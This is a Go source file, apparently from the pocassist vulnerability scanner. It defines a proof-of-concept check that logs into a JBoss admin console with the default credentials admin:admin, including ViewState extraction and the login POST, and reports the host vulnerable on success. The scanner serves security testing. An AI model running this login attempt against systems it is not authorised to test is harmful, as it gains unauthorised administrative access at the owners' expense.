package scripts

import (
	"bytes"
	"fmt"
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
	"net/http"
	"net/url"
)

func getViewstatAdminConsole(page []byte) []byte {

	newPage := bytes.Replace(page, []byte("\\n"), []byte("\n"), -1)
	pageList := bytes.Split(newPage, []byte("\n"))
	var subStr = []byte("javax.faces.ViewState")
	for _, value := range pageList {
		if bytes.Contains(value, subStr) {
			valueNum := bytes.Count(value, []byte(`value="`))
			if valueNum == 1 {
				return bytes.Split(bytes.Split(value, []byte(`value="`))[1], []byte(`"`))[0]
			} else if valueNum > 1 {
				return bytes.Split(bytes.Split(value, []byte(`value="`))[2], []byte(`"`))[0]
			}
		}

	}
	return []byte{}
}

// JBossAdminConsoleWeakPass jboss 管理控制台弱口令
func JBossAdminConsoleWeakPass(args *ScriptScanArgs) (*util.ScanResult, error) {
	var username = "admin"
	var password = "admin"

	// 定义报文列表
	var respList []*proto.Response

	rawurl := ConstructUrl(args, "/")
	rawurl = fmt.Sprintf("%v/admin-console/login.seam", rawurl)

	fastReq := fasthttp.AcquireRequest()
	cookie := fasthttp.AcquireCookie()
	defer fasthttp.ReleaseRequest(fastReq)
	defer fasthttp.ReleaseCookie(cookie)
	fastReq.Header.SetMethod(http.MethodGet)

	fastReq.SetRequestURI(rawurl)
	fastReq.Header.Set("Connection", "keep-alive")
	fastReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp1, err := util.DoFasthttpRequest(fastReq,false)

	if err != nil {
		util.ResponsePut(resp1)
		return nil, err
	}

	if resp1.Status != 200 {
		util.ResponsePut(resp1)
		return &util.InVulnerableResult, nil
	}
	respList = append(respList, resp1)
	for key, value := range resp1.Headers {
		err := cookie.Parse(value)
		if err == nil {
			fastReq.Header.SetCookie(key, string(cookie.Value()))
		}
	}

	state := getViewstatAdminConsole(resp1.Body)
	var payload = bytes.Buffer{}
	payload.WriteString("login_form=login_form&login_form%3Aname=")
	payload.WriteString(username)
	payload.WriteString("&login_form%3Apassword=")
	payload.WriteString(password)
	payload.WriteString("&login_form%3Asubmit=Login&javax.faces.ViewState=")
	payload.WriteString(url.QueryEscape(string(state)))

	fastReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	fastReq.Header.SetMethod(http.MethodPost)
	fastReq.SetBody(payload.Bytes())


	// 跟随跳转
	resp2, err := util.DoFasthttpRequest(fastReq, true)
	if err != nil {
		util.ResponsePut(resp2)
		return nil, err
	}

	if bytes.Contains(resp2.Body, []byte("Welcome admin")) {

		respList = append(respList, resp2)
		return util.VulnerableHttpResult(rawurl,username+":"+password, respList), nil
	}
	util.ResponsePut(resp1)
	util.ResponsePut(resp2)
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-jboss-console-weakpwd", JBossAdminConsoleWeakPass)
}
